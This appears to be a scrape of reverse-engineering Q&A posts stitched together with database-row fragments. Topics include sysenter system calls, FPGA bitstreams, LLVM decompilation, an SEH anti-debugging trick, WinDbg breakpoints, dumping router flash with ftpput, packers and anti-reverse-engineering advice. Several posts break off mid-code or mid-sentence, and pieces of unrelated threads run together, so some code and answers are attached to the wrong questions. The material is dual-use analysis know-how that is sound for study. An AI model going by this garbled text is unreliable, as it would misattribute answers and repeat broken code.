<p>I am pretty good at using <code>int $0x80</code>, for example, here is a sample
code of a classic 'Hello World!' in assembler using <code>int $0x80</code> (compile it with <code>gcc -nostdlib -o hello-int80 hello-int80.s</code>):</p>

<pre><code>.data
msg:
  .ascii ""Hello World!\n""
  len = . - msg

.text
.globl _start

_start:
# Write the string to stdout
  movl  $len, %edx
  movl  $msg, %ecx
  movl  $1, %ebx
  movl  $4, %eax
  int   $0x80

# and exit
  movl  $0, %ebx
  movl  $1, %eax
  int   $0x80
</code></pre>

<p>But the <code>sysenter</code> is often ending with a segmentation fault error. Why ? And, how to use it right ?</p>

<p>Here is an example with <code>call *%gs:0x10</code> (compiled with <code>gcc -o hello-gs10 hello-gs10.s</code>). Note that I need to go through the <code>libc</code> initialization before calling it properly (that is why I am using <code>main</code> and not anymore <code>_start</code> and, that is also why I removed the option <code>-nostdlib</code> from the compile line):</p>

<pre><code>.data
msg:
  .ascii ""Hello World!\n""
  len = . - msg

.text
.globl main

main:
# Write the string to stdout
  movl  $len, %edx
  movl  $msg, %ecx
  movl  $1, %ebx
  movl  $4, %eax
  call  *%gs:0x10

# and exit
  movl  $0, %ebx
  movl  $1, %eax
  call  *%gs:0x10
</code></pre>

<p>Also, the <code>syscall</code> is working pretty well also if you know the <a href=""http://lxr.linux.no/#linux+v2.6.32/arch/x86/include/asm/unistd_64.h"">syscall codes for this architecture</a> (thanks to lfxgroove) (compiled with: <code>gcc -m64 -nostdlib -o hello-syscall hello-syscall.s</code>):</p>

<pre><code>.data
msg:
  .ascii ""Hello World!\n""
  len = . - msg

.text
.globl _start

_start:
# Write the string to stdout
  movq  $len, %rdx
  movq  $msg, %rsi
  movq  $1, %rdi
  movq  $1, %rax
  syscall
# and exit
  movq  $0, %rdi
  movq  $60, %rax
  syscall
</code></pre>

<p>So, the only problem I have to trigger a system call is this <code>sysenter</code> way. Here is an example with <code>sysenter</code> ending with a segmentation fault (compiled with <code>gcc -m32 -nostdlib -o hello-sysenter hello-sysenter.s</code>):</p>

<pre><code>.data
msg:
  .ascii ""Hello World!\n""
  len = . - msg

.text
.globl _start

_start:
# Write the string to stdout
  movl  $len, %edx
  movl  $msg, %ecx
  movl  $1, %ebx
  movl  $4, %eax

  push    final
  sub $12, %esp
  mov %esp, %ebp

  sysenter
# and exit
final:  
  movl  $0, %ebx
  movl  $1, %eax

  sub $12, %esp
  mov %esp, %ebp

  sysenter

","<h2>System calls through <code>sysenter</code></h2>

<p><code>sysenter</code> is a i586 instruction, specifically tight to 32-bits
applications. It has been subsumed by <code>syscall</code> on 64-bits plateforms.</p>

<p>One particularity of <code>sysenter</code> is that it does require, in addition
to the usual register setting, a few manipulations on the stack before
calling it. This is because before leaving <code>sysenter</code>, the process
will go through the last part of the <code>__kernel_vsyscall</code> assembler
snippet (starting from <code>0xf7ffd430</code>):</p>

<pre><code>Dump of assembler code for function __kernel_vsyscall:
   0xf7ffd420 &lt;+0&gt;:        push   %ecx
   0xf7ffd421 &lt;+1&gt;:        push   %edx
   0xf7ffd422 &lt;+2&gt;:        push   %ebp
   0xf7ffd423 &lt;+3&gt;:        mov    %esp,%ebp
   0xf7ffd425 &lt;+5&gt;:        sysenter 
   0xf7ffd427 &lt;+7&gt;:        nop
   0xf7ffd428 &lt;+8&gt;:        nop
   0xf7ffd429 &lt;+9&gt;:        nop
   0xf7ffd42a &lt;+10&gt;:       nop
   0xf7ffd42b &lt;+11&gt;:       nop
   0xf7ffd42c &lt;+12&gt;:       nop
   0xf7ffd42d &lt;+13&gt;:       nop
   0xf7ffd42e &lt;+14&gt;:       int    $0x80
=&gt; 0xf7ffd430 &lt;+16&gt;:       pop    %ebp
   0xf7ffd431 &lt;+17&gt;:       pop    %edx
   0xf7ffd432 &lt;+18&gt;:       pop    %ecx
   0xf7ffd433 &lt;+19&gt;:       ret    
End of assembler dump.
</code></pre>

<p>So, the <code>sysenter</code> instruction expect to have the stack forged in that
way:</p>

<pre><code>0x______0c  saved_eip   (ret)
0x______08  saved_%ecx  (pop %ecx)
0x______04  saved_%edx  (pop %edx)
0x______00  saved_%ebp  (pop %ebp)
</code></pre>

<p>That's why, each time we need to call <code>sysenter</code>, we first have to
push the values of the saved <code>%eip</code>, and the same with<code>%ecx</code>, <code>%edx</code>
and <code>%ebp</code>. Which leads to:</p>

<pre><code>.data
msg:
    .ascii ""Hello World!\n""
    len = . - msg

.text
.globl _start
_start:
    pushl  %ebp
    movl   %esp, %ebp
# Write the string to stdout
    movl   $len, %edx
    movl   $msg, %ecx
    movl   $1, %ebx
    movl   $4, %eax
# Setting the stack for the systenter
    pushl  $sysenter_ret
    pushl  %ecx
    pushl  %edx
    pushl  %ebp
    movl   %esp,%ebp
    sysenter
# and exit
sysenter_ret:    
    movl   $0, %ebx
    movl   $1, %eax

<p>I have a file composed entirely of data structures; I've been trying to find a tool that will enable me to open this file, and declare (perhaps) a type and offset such that i may work with the presumed primitive data type individually.</p>

<p>e.g. I declare the 4 bytes located at offset 0x04 to be a 32-bit unsigned integer, and would like to inspect the value at this location (read as big-endian perhaps) and then work with this integer individually (perhaps see what it looks like encoded as a 4-byte ascii string and attempt to read it, etc.)</p>

<h1>Specifics</h1>

<p>I have a 4096 byte file containing C-structs with member elements as integers ranging from 16-64 bits in length; the following is an example:</p>

<pre><code>struct my_struct {
uint_32 magic
} // sizeof(my_struct) == 0x04
</code></pre>

<p>In this case, magic = 'ball', and so when the file is opened in a text editor it reads as 'llab...', and obviously can also be represented as a 32-bit integer</p>

<h1>Question</h1>

<p>Is there a tool that enables static analysis of flat data structure files?</p>

<h1>What I've considered thus far as a solution</h1>

<p>I've considered writing a command line tool in Python to do this, but if something already exists I'd prefer to save time, and perhaps learn more about this topic by using a tool designed by someone more experienced. If it seems to you that I am going about this incorrectly (this is my first serious exploration into this kind of reversing) please guide my understanding, thanks.</p>

<h1>Where I have already researched</h1>

<p>Googled 'reverse engineering tools' and browsed the links</p>

<p>Checked wikipedia's reverse engineering pages</p>

<p>Tried some first principles reasoning</p>

<p>Checked pypi</p>

"Reversing an FPGA circuit","4650","","<p>Let's assume I have a device with an FPGA on it, and I managed to extract the bitstream from its flash. How would I go about recovering its behavior?</p>

<p>One simple case is if it implements a soft processor - in that case there should be firmware for that processor somewhere and I can just disassemble that. But what if it's just a bunch of IP blocks and some additional logic?</p>
","<p>While FPGA makers don't just throw their formats out there, there is extensive documentation at a low level. Xilinx devices are a good example. </p>

<p>To reverse engineer the bit stream you might generate test cases that implement simple logic and see how those translate to the bit stream, then move on to designs that exercise different portions of the chip. </p>

<p>At the basic level, you would want to know how a CLB is controlled then the IOBs and interconnects. the CLBs are the logic the IOBs the are connected to the pins and interconnects link up the CLBs and  IOBs. <a href=""http://www2-c703.uibk.ac.at/teaching/ws2009/esa/fpga.pdf"">This document</a> should give you a lot of insight into how FPGAs are implemented and how you might go about reverse engineering the bit streams. Do note that newer FPGAs are moving to 6-input luts rather than 4-input as was common.</p>

<p>Just keep in mind that the bit stream isn't software - it is a hardware configuration image. So, it's actually very similar to how ENIAC must have been programmed - rewiring circuits and flipping switches to program it - except in this case you are setting up routes with interconnects and logic in the CLBs.</p>

<p>Also the guy behind the Ben NanoNote is writing a <a href=""https://github.com/Wolfgang-Spraul/fpgatools"">fpga-toolchain</a> which I am following avidly.  Since a secondary to my SparcStation collecting hobby is reimplementing sun4m, a SparcStation architecture, in FPGA. After all who wouldn't want to be able to configure an FPGA from an FPGA with your own processor design on it.</p>

"GUI for transforming Java Bytecode based on decompiled source?","4648","","<p>Okay. So I've just come up with the most amazing program for java developers and reverse-engineerers and I was wondering if something like the following program already exists:</p>

<p>For example, I would like replace one method with my own or change a field's access within a compiled class file.</p>

"What is the state of art in LLVM IR decompilation?","4464","","<p>LLVM IR is a fairly high-level, typed bitcode which can be directly executed by LLVM and compiled to JIT on the fly. It would not surprise me if a new executable format or programming language was designed directly on top of LLVM, to be executed as if it were an interpreted language.</p>

<p>In this regard, I am curious as to the state of the art on LLVM decompilation. Because it is a typed bitcode specifically designed to be easy to analyze, one might expect that it is relatively easy to decompile (or at least reassemble into a more readable or logical form).</p>

<p>Googling turns up <a href=""http://www.cdl.uni-saarland.de/publications/theses/moll_bsc.pdf"">this BSc thesis</a> which does a relatively rudimentary job, but seemingly few other leads. I might have expected this <a href=""http://www.cdl.uni-saarland.de/people/hack/publications.php"">fellow's supervisor</a> to have done some further research in this area, but it seems his focus is more towards the compiler design area of research.</p>

<p>Are there research projects, commercial prototypes, or even any kinds of active research being done in the field of LLVM decompilation?</p>
","<p>It's extremely easy to decompile. LLVM for a long time shipped with a CBackend that would convert LLVM into C. </p>

<p>The LLVM that is created by todays frontends (clang) is very amenable to any kind of analysis and understanding that you can think of. So you can probably just use normal LLVM tools (opt, llc) to ""decompile"" the IR. I find LLVM IR quite readable on its own, but I'm strange. </p>

<p>However, just like compilation of C to assembler, some information is lost or destroyed. Structure field names are gone, forever replaced with indexes. Their types remain though. Control flow, as a concept, remains, there is no confusion of code and data, but functions can be removed because they are dead or inlined. I believe enum values are removed as well. Parameter information to function remains, as do the types of global variables. </p>

<p>There actually is a decent <a href=""http://lists.cs.uiuc.edu/pipermail/llvmdev/2011-October/043719.html"">post</a> where an LLVM contributor outlines pitfalls and problems with using their bitcode format in the manner that you suggest.

<pre><code>    push next
    push fs:[0]
    mov fs:[0], esp
    int3
    ...
next:
</code></pre>

<p>I see that something happens on the <code>int3</code> (an error), but I don't understand why, and how to follow execution while keeping control.</p>
","<h1>TL;DR</h1>

<ol>
<li><p>the first 3 lines set an exception handler (an 'error catcher')</p></li>
<li><p>the <code>int3</code> generates an exception</p></li>
<li><p>execution resumes at <code>next</code></p></li>
</ol>

<hr>

<h1>Explanation</h1>

<p>this trick is (ab)using <a href=""http://www.microsoft.com/msj/0197/exception/exception.aspx"" rel=""nofollow noreferrer"">Structured Exception Handling</a>, a mechanism to define exception handlers, typically by compilers when <code>try</code>/<code>catch</code> blocks are used.</p>

<p>In 32bits versions of Windows, they can be set on the fly, without any pre-requirement (unless the binary is compiled with /SafeSEH).</p>

<p>The first element of the exception handlers' chain is pointed by the first member of the <a href=""http://en.wikipedia.org/wiki/Win32_Thread_Information_Block"" rel=""nofollow noreferrer"">Thread Information Block (TIB)</a>, in turn a member of the <a href=""http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Thread/TEB.html"" rel=""nofollow noreferrer"">Thread Environment Block (TEB)</a>, which is pointed to by <code>fs:0</code> (which is also reachable 'directly' - via something like <code>ds:7efdd00</code>, depending on the OS version etc)</p>

<p>So here is what happens:</p>

<ol>
<li><p>the first two <code>push</code> reserve stack space for the structure <code>_EXCEPTION_REGISTRATION_RECORD</code>.</p>

<ol>
<li>the new top handler</li>
<li>the previous top handler, which was until now at <code>fs:[0]</code></li>
</ol></li>
<li><p>the <code>mov</code> sets the current stack position as the new structure. When an exception happens, <code>next</code> will be now the first called handler.</p></li>
<li><p><code>int3</code> triggers an exception instantaneously (there are many other kinds of <a href=""http://seh.corkami.com"" rel=""nofollow noreferrer"">exception triggers</a>).</p></li>
<li><p>as an exception is triggered, Windows dispatches the exception to the first handler, and the next one if it's not handled, until one of them has handled it.</p></li>
</ol>

<p><img src=""https://corkami.googlecode.com/svn/wiki/pics/seh_flowchart.png"" alt=""flowchart of Exception handling""></p>

<h1>Following execution</h1>

<p>This is done here under OllyDbg 1.10. YMMV.</p>

<p>As we want to go through exceptions ourselves, we have to ask OllyDbg not to handle them:</p>

<ol>
<li><p>go to debugging options: <kbd>Alt</kbd>-<kbd>O</kbd>, tab <code>Exceptions</code></p></li>
<li><p>unselect <code>INT3 breaks</code></p></li>
</ol>

<p>And when an exception is triggered, we have to enforce that execution is done via exceptions (see below).</p>

<p>Here are 3 methods of increasing level to follow the exception handling execution safely:</p>

<h2>step by step: set a breakpoint manually</h2>

<p>As the handler has just been set on the stack, you can manually set a breakpoint then run.</p>

<ol>
<li><p>select the new handler address on the stack</p>

<p><img src=""https://i.stack.imgur.com/QQQOQ.png"" alt=""new handler on the stack""></p></li>
<li><p>Right-click or <kbd>F10</kbd></p>

<ul>
<li>select <code>Follow in Dump</code></li>
</ul></li>
<li><p>in the dump window, open the menu (same shortcut)</p>

<ul>
<li>select <code>BreakPoint</code>, then <code>Hardware, on execution</code></li>
</ul></li>
<li><p>Execute: menu <code>Debug/Run</code> / shortcut <kbd>F9</kbd> / command-line <code>g</code></p></li>
<li><p>Exceptions will be triggered</p></li>
<li><p>Execute with exception handling: shortcut <kbd>Shift</kbd>-<kbd>F9</kbd> / command-line <code>ge</code>.</p></li>
</ol>

<h2>shortcut: execute until exception handler via command-line</h2>

<ul>
<li><p>as the address is on the stack, the easiest way is to type via the command line <code>ge [esp+4]</code>, which means, <code>Go with Exceptions</code>, until the 2nd address on the stack is encountered. Thus, no need to set and unset a breakpoint.</p>

<ul>
<li>in the case of a more complex example, where the address might not be obvious on the stack anymore, then the absolute formula would be <code>ge ds:[fs:[0]+4]</code>, which just gets the actual address from the TIB.</li>
</ul></li>
</ul>

<h2>keeping full control: break on <code>KiUserExceptionDispatcher</code></h2>

<p><code>KiUserExceptionDispatcher</code> is the Windows API handling all user-mode exceptions. Setting a breakpoint there guarantees that you keep full control - but then, you're in the middle of a Windows API ;) </p>

<p>In this case, you can ask OllyDbg to skip exceptions, as you will still break execution manually in any cases. You might also want to combine that with a <a href=""http://tuts4you.com/download.php?list.53"" rel=""nofollow noreferrer"">script</a>.</p>

<p>Of course, some advanced code might check that you set a breakpoint on it before triggering an exception.</p>

<p>What can I do to look at the values of the paramaters passed (particularly the second one: <em>LPCTSTR lpSubKey</em>)? Also, what can I do to set a conditional breakpoint based on the value?</p>

<p>I have the Visual Studio debugger as well as WinDbg. I'm willing to try other tools as well.</p>
","<p>This is doable in WinDbg, but the syntax isn't the greatest. The other answers are probably better if you're just looking to get a result quickly. That said, here's how you'd do it.</p>

<p>RegOpenKeyExW is an stdcall function, and it looks like you're on a 32-bit version of Windows, so when you enter the function the first argument will be at <code>ESP+4</code>, the second at <code>ESP+8</code>, etc. The signature for it is:</p>

<pre><code>LONG WINAPI RegOpenKeyEx(
  _In_        HKEY hKey,
  _In_opt_    LPCTSTR lpSubKey,
  _Reserved_  DWORD ulOptions,
  _In_        REGSAM samDesired,
  _Out_       PHKEY phkResult
);
</code></pre>

<p>So at <code>ESP+8</code> you'll find a pointer to a null-terminated Unicode string (<code>lpSubKey</code>). You can test this out by setting an unconditional breakpoint on RegOpenKeyExW and then using <code>du poi(esp+8)</code> to print the string.</p>

<p>To do the next piece – stopping when the value of <code>lpSubKey</code> is equal to some pattern, you can check out <a href=""http://msdn.microsoft.com/en-us/library/windows/hardware/ff556853%28v=vs.85%29.aspx"">MSDN's documentation</a>, which contains an example of doing exactly that. I don't have access to a Windows machine at the moment, but the following should do what you want (adapted from the MSDN example):</p>

<pre><code>bp advapi32!RegOpenKeyExW ""$$&lt;c:\\commands.txt""
</code></pre>

<p>And then create <code>c:\commands.txt</code> with the following contents:</p>

<pre><code>.if (poi(esp+8) != 0) { as /mu ${/v:SubKey} poi(esp+8) } .else { ad /q ${/v:SubKey} }
.if ($spat(@""${SubKey}"", ""Foo*"") == 0)  { gc } .else { .echo SubKey }
</code></pre>

<p>You can replace <code>""Foo*""</code> in the above with any <a href=""http://msdn.microsoft.com/en-us/library/windows/hardware/ff558819%28v=vs.85%29.aspx"">valid string wildcard</a>.</p>

<p>Breaking this down, the first <code>.if</code> sets up an alias named <code>SubKey</code> equal to the contents of the unicode string at <code>esp+8</code>. The second line matches that string against the pattern <code>""Foo*""</code>; if it doesn't match, then <code>gc</code> is used to continue execution without stopping. If it does match, <code>.echo SubKey</code> prints out the string, and then breaks.</p>

"Dumping firmware through mtdblock device","4369","","<p>This is my first attempt at doing some reverse engineering. I'm trying to dump the filesystem off a huawei hg523a TalkTalk router.</p>

<p>The problem is its quite limited in the amount of programs that are on the device. Below are a list of programs i can use.</p>

<pre><code>BusyBox vv1.9.1 (2012-03-05 00:16:52 CST) multi-call binary
Currently defined functions:
        [, [[, arp, ash, cat, chmod, chown, cp, date, echo, ftpget,
        ftpput, halt, ifconfig, init, kill, killall, linuxrc,
        ln, ls, mcast, mkdir, mknod, mount, netstat, nslookup,
        ping, poweroff, ps, reboot, rm, route, sh, sleep, test,
        top, traceroute, umount, vconfig, wget
</code></pre>

<p>So im trying to extract the filesystem to another linux machine so i can go through it more eaisely. I can upload single files with the ftpput command.</p>

<pre><code>cat /proc/mtd
dev:    size   erasesize  name
mtd0: 00010000 00001000 ""boot""
mtd1: 00001000 00001000 ""flag""
mtd2: 003c0000 00001000 ""main""
mtd3: 0002d000 00001000 ""config""
</code></pre>

<p>What im trying to do is upload mtdblock0-3 and then mount this on my other machine to explore the folder structure etc.. It looks like from /proc/mounts that it is a squashfs file system.</p>

<pre><code>cat /proc/mounts
rootfs / rootfs rw 0 0
/dev/root / squashfs ro 0 0
none /dev tmpfs rw 0 0
/proc /proc proc rw 0 0
none /var tmpfs rw 0 0
none /tmp tmpfs rw 0 0
none /mnt tmpfs rw 0 0
</code></pre>

<p>So basically i upload the mtdblock0.</p>

<pre><code>ftpput -s -v -u james -p password -l /dev/mtdblock0 -r ftpdir/mtdblock0 192.168.1.64
</code></pre>

<p>and mount it on the other computer with:</p>

<pre><code>root@kali:~/Desktop/talktalk/blocks# mount -t squashfs mtdblock0 /mnt
mount: wrong fs type, bad option, bad superblock on /dev/loop0,
       missing codepage or helper program, or other error
       In some cases useful info is found in syslog - try
       dmesg | tail  or so
</code></pre>

<p>Could anyone guide me in the right direction as to what i might be doing wrong? So it not possible to transfer the filesystem in this way?</p>

<p>thank you in advance for your help.</p>
","<p>As the names in /proc/mtd suggest, mtd0 is probably not a file system, but more likely is the boot loader. Likewise, the name of mtd3 suggests that it contains the saved configuration settings (admin password, wireless settings etc).</p>

<p>The ""flags"" and ""main"" names for mtd1 and mtd2 respectively are a bit ambiguous, but I would expect, due to the name and the size, that mtd2 contains the file system. It also probably contains the Linux kernel as well, so the file system may not start at the beginning of mtd2; once you've ftp'd off a copy of mtd2 you'll have to find the start of the file system and dd it out in order to extract/mount it.</p>

<p>As a side note, don't be surprised if once you find the squashfs file system, your Linux host can't mount it. There are many hacked up versions of squashfs, and you may need to find the right squashfs tools for that particular version and run unsquashfs on the image to extract the files.</p>

"How common are virtualized packers in the wild?","4367","","<p>I'm just getting into the RE field, and I learned about virtualized packers (like VMProtect or Themida) in a class about a year ago. How often is malware in the wild really packed with virtualized packers, and what is the state of the art in unpacking them for static analysis?</p>
","<h1>virtualizers usage in the wild</h1>

<p>They are rarely used, and even worse (or better), rarely used in a useful way.</p>

<h2>how they're used</h2>

<p>Typically, it was the use of a virtualizer of over only the main function, or another binary packer, and both cases don't prevent analysis: if you bypass the virtualized packer code, then you get the original unpacked code anyway.</p>

<h2>why they're not used more often</h2>

<ul>
<li>It makes the target bloated and slower</li>
<li>they're not trivial to use correctly</li>
<li>it's fairly common to detect them based on their (usually pirated) licence's watermark, so no matter what you'd virtualize, it would be detected by a specific fingerprint.</li>
</ul>

<h2>a meaningful example</h2>

<p>AFAIK the only known smart use of a virtualizer (VMProtect here) in a malware is Trojan.Clampi, for which Nicolas Fallière wrote a <a href=""http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/inside_trojan_clampi.pdf"">white paper</a>, but it's not so detailed.

"What kinds of steps can I take to make my C++ application harder to reverse engineer?","4341","","<p>If I am building a C++ application and I want to make it more difficult to reverse engineer, what steps can I take to do this?</p>

<ul>
<li>Does the choice of compiler affect this?</li>
<li>What about compiler flags, presumably a high optimization level would help, what about other flags?</li>
<li>Does stripping symbols help and not building with debug symbols?</li>
<li>Should I encrypt any internal data such as static strings?</li>
<li>What other steps might I take?</li>
</ul>
","<p><strong>Compiler</strong></p>

<p>The choice of a compiler has minimal effects on the difficulty to reverse engineer your code. The important things to minimize are all related to information leaks from your code. You want to at least disable any runtime type information (RTTI). The leakage of type information and the simplicity of the instruction set of the virtual machine is one of the reasons CLR and JVM code is easier to reverse engineer. They also have an JIT which applies optimizations to code which may reduce the strength of obfuscation. Obfuscation is basically the opposite of optimization and a lot of obfuscations are solved by first applying an optimization pass.</p>

<p><strong>Debugging information</strong></p>

<p>I would advice you to also turn off any debugging information, even if it doesn't leak any majorly important information today it might do so tomorrow. The amount of information leakage from the debug information varies from compiler to compiler and from binary format to binary format. For instance Microsoft Visual C++ keeps all important debugging information in an external database, usually in the form of a PDB. The most you might leak is the path you used when building your software.</p>

<p><strong>Strings</strong></p>

<p>When it comes to strings you should definitely encrypt them if you need them at all. I would aim to replace all the ones that are for error tracing and error logging with numeric enumerations. Strings which reveal any sort of information about what is going on right now in your binary needs to be unavailable. If you encrypt the strings, they will be decrypted. Try to avoid them as much as possible.</p>

<p><strong>System APIs</strong></p>

<p>Another strong source of information leakage is imports of system APIs. You want to make sure that any imported function which has a known signature is well-hidden and can not be found using automatic analysis. So an array of function pointers from something like LoadLibrary/GetProcAddress is out of the question. All calls to imported functions need to go through a one way function and needs to be embedded within an obfuscated block.</p>

<p><strong>Standard runtime libraries</strong></p>

<p>Something a lot of people forget to take into consideration is the information leaked by standard libraries, such as the runtime of your C++ compiler. I would avoid the use of it completely. This is because most experienced reverse engineers will have signatures prepared for a lot of standard libraries.</p>

<p><strong>Obfuscation</strong></p>

<p>You should also cover any critical code with some sort of heavy obfuscation. Some of the heavier and cheaper obfuscations right now are <a href=""http://oreans.com/codevirtualizer.php"">CodeVirtualizer/Themida</a> and <a href=""http://vmpsoft.com/"">VMProtect</a>. Be aware that these packages have an abundance of defects though. They will sometimes transform your code to something which will not be the equivalent of the original which can lead to instability. They also slow down the obfuscated code significantly. A factor of 10000 times slower is not uncommon. There's also the issue of triggering more false positives with anti-virus software. I would advice you to sign your software using a reputable certificate authority.</p>

<p><strong>Separation of functional blocks</strong></p>

<p>The separation of code into functions is another thing which makes it easier to reverse engineer a program. This applies especially when the functions are obfuscated because it creates boundaries around which the reverse engineer can reason about your software. This way the reverse engineer can solve your program in a divide and conquer manner. Ideally you would want your software in one effective block with obfuscation applied uniformly to the entire block as one. So reduce the number of blocks, use inlining very generously and wrap them in a good obfuscation algorithm. The compiler can easily do some heavy optimizations and stack ordering which will make the block harder to reverse engineer.</p>

<p><strong>Runtime</strong></p>

<p>When you hide information it is important that the information is well hidden at runtime as well. A competent reverse engineer will examine the state of your program as it is running. So using static variables that decrypt when loaded or by using packing which is completely unpacked upon loading will lead to a quick find. Be careful about what you allocate on the heap. All heap operations go via API calls and can be easily logged to a file and reasoned about. Stack operations are generally harder to keep track of just because of how frequent they are. Dynamic analysis is just as important as static. You need to be aware of what your program state is at all times and what information lies where.</p>

<p><strong>Anti-debugging</strong></p>

<p>Anti-debugging is worthless. Do not spend time on it. Spend time on making sure your secrets are well hidden independent of whether your software is at rest or not.</p>

<p><strong>Packing and encrypting code segment</strong></p>

<p>I will group encryption and packing into the same category. They both serve the same purpose and they both have the same issues. In order to execute the code, the CPU needs to see the plain text. So you have to provide the key in the binary. The only remotely effective way of encrypting and packing code segments is if you encrypt and decrypt them at functional boundaries and only if the decryption happens upon function entry and then re-encryption happens when leaving the function. This will provide a small barrier against dumping your binary as it is running but is must be coupled with strong obfuscation.</p>

<p><strong>Finally</strong></p>

<p>Study your software in something like the free version of IDA. Your goal is to make sure that it becomes virtually impossible for the reverse engineer to find a steady mental footing. The less information you leak and the more changing the environment is, the harder it will be to study. If you're not an experienced reverse engineer, designing something hard to reverse engineer is almost impossible.</p>

<p>If you're designing a copy protection system prepare for it to be broken mentally. Make sure you have a plan for how you will deal with the break and how to make sure the next version of your software adds enough value to drive upgrades. Build your system on a solid ground which can not be broken, do not resort to generating your own license keys using some custom algorithm hidden in the manner I described above. The system needs to be built on a sound cryptographic foundation for unforgeability of messages.</p>

"Creating IDA Pro debugger plugins - API documentation and examples?","4321","","<p>Are there any good resources for developing debugger plugins in IDA Pro using the SDK that describe the IDA debugger API? An example of this is the <a href=""http://sourceforge.net/projects/idaproarmdebug/"">IDA Pro ARM debugger plugin</a> on Sourceforge. There seem to be few projects that have accomplished this. Specifically, how do you make a plugin in IDA which registers itself as one of the available debuggers and allows stepping through the IDA database while controlling a target? </p>

<li>in init(), it must set the global variable <code>dbg</code> to a pointer to an implementation of <code>debugger_t</code> structure. See <code>idd.hpp</code> for the definition.</li>

"When to use OllyDgb over Immunity Debugger","4277","","<p>I have always been curious when I should use OllyDbg over Immunity Debugger.</p>

<p>Immunity Debugger has inherited code from OllyDbg and can perform scripted debugging with Python.</p>

When I search for the same task with OllyDbg, I regularly find information more relevant to the reverse engineering task I am trying to accomplish.</p>

<p>If Immunity Debugger supports scripted debugging in Python (which simplifies the scripting process as opposed to making a plugin for OllyDbg), then why would I want to use OllyDbg over Immunity Debugger?</p>
","<p>Immunity Debugger is forked from OllyDbg v1.10.</p>

"How does services.exe trigger the start of a service?","4256","","<p>I'm trying to work out the internals of how a Windows process starts and maintains communication with <code>services.exe</code>. This is on Windows 8 x64, but if you have tips for Windows 7 that is fine too.</p>

<p>So far I figure out <code>services.exe</code> does something approximately like this:</p>

<pre><code>PROCESS_INFORMATION     pi;
    TCHAR                   szExe[] = _T(""C:\\Program Files\\TestProgram\\myWindowsService.exe"");

    // can see EXTENDED_STARTUPINFO_PRESENT is used, but couldn't figure out if any/what attributes are added
    BOOL status = InitializeProcThreadAttributeList(nullptr, 0, 0, &amp;attribute_list_size);
    PPROC_THREAD_ATTRIBUTE_LIST attribute_list = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attribute_list_size);

    startup_info.StartupInfo.cb = sizeof(STARTUPINFOEX);
    startup_info.lpAttributeList = attribute_list;
    startup_info.StartupInfo.dwFlags = STARTF_FORCEOFFFEEDBACK;
    startup_info.StartupInfo.wShowWindow= SW_HIDE;

        if(CreateProcess(
            NULL,
            szExe,
            NULL,
            NULL, 
            FALSE,
            CREATE_SUSPENDED | 
            CREATE_UNICODE_ENVIRONMENT | 
            DETACHED_PROCESS | 
            EXTENDED_STARTUPINFO_PRESENT,
            NULL,
            NULL, 
            &amp;startup_info.StartupInfo, 
            &amp;pi))
    {
        HANDLE hEvent;
        hEvent=CreateEvent(NULL,FALSE,FALSE,NULL); // I traced this call during service sstartup; no idea what purpose it serves?

        ResumeThread(pi.hThread);
</code></pre>

<p>Now my question is, how does the actual ""Start"" get communicated to the service? I know the service itself does something like this:</p>

<ol>
<li>main entry point (à la console program)</li>
<li>Call <code>advapi!StartServiceCtrlDispatcher</code></li>
<li>Goes to <code>sechost!StartServiceCtrlDispatcher</code></li>
<li>This jumps into <code>sechost!QueryServiceDynamicInformation</code></li>
</ol>

<p>I'm trying to figure out what method in <code>services.exe</code> is used to hook into this start process. Ideally I want to be able to write a PoC code that can ""launch"" a simple Windows service and get it to start, without it being registered as a Windows Service, i.e. wrapped inside a ""stand alone service control manager"". I'm looking for some tips of what best to look for next.</p>

<p>There is also a reference to <code>services.exe</code> in <code>\\pipe\ntsvcs</code>. The <a href=""http://en.wikipedia.org/wiki/Service_Control_Manager"">Wikipedia article about SCM</a> refers to <code>\Pipe\Net\NtControlPipeX</code> being created, but as far as I can tell, that is in Windows 2000 (maybe XP) but I can't see this happening on Windows 8.</p>
","<p>This is my basic understanding of how Windows service works. I have used it with Windows XP and Windows 7. These are general concepts anyways. </p>

<p>Any service requires three things to be present: </p>

<ol>
<li>A Main Entry Point</li>
<li>A Service Entry Point</li>
<li>A Service Control Handler</li>
</ol>

<p>You are absolutely right. In the Main Entry Point service must call <strong><code>StartServiceCtrlDispatcher(const SERVICE_TABLE_ENTRY *lpServiceTable)</code></strong> providing Service Control Manager with filled in <strong><code>SERVICE_TABLE_ENTRY</code></strong>, which is (per <a href=""http://msdn.microsoft.com/en-us/"" rel=""nofollow noreferrer"">MSDN</a>):</p>

<pre><code>typedef struct _SERVICE_TABLE_ENTRY {
    LPTSTR                  lpServiceName;
    LPSERVICE_MAIN_FUNCTION lpServiceProc;
} SERVICE_TABLE_ENTRY, *LPSERVICE_TABLE_ENTRY;
</code></pre>

<p>As you can see, there are two things which are required to be supplied in SERVICE_TABLE_ENTRY structure. Those are pointer to name of the service, and pointer to service main function. Right after service registration, Service Control Manager calls  Service Main function, which is also called ServiceMain or Service Entry Point. Service Control Manager expects that following tasks are performed by Service Entry Point:</p>

<ol>
<li>Register the service control handler.</li>
<li>Set Service Status</li>
<li>Perform necessary initialization (creating events, mutex, etc)</li>
</ol>

<p>Service Control Handler is a callback function with the following definition: <strong><code>VOID WINAPI ServiceCtrlHandler (DWORD CtrlCode)</code></strong>(<a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms685149%28v=vs.85%29.aspx"" rel=""nofollow noreferrer"">MSDN</a>). It is expected to handle service STOP, PAUSE, CONTINUE, and SHUTDOWN. It is imperative that each service has a handler to handle requests from the SCM. Service control handler is registered with <strong><code>RegisterServiceCtrlHandlerEx()</code></strong>(<a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms685058%28v=vs.85%29.aspx"" rel=""nofollow noreferrer"">MSDN</a>), which returns <strong><code>SERVICE_STATUS_HANDLE</code></strong>. Service uses the handle to communicate to the SCM. The control handler must also return within 30 seconds. If it does not happen the SCM will return an error stating that the service is unresponsive. This is due to the fact that the handler is called out of the SCM and will freeze the SCM until it returns from the handler. Only then, service may use <strong><code>SetServiceStatus()</code></strong>(<a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms686241%28v=vs.85%29.aspx"" rel=""nofollow noreferrer"">MSDN</a>) function along with service status handle to communicate back to the SCM. </p>

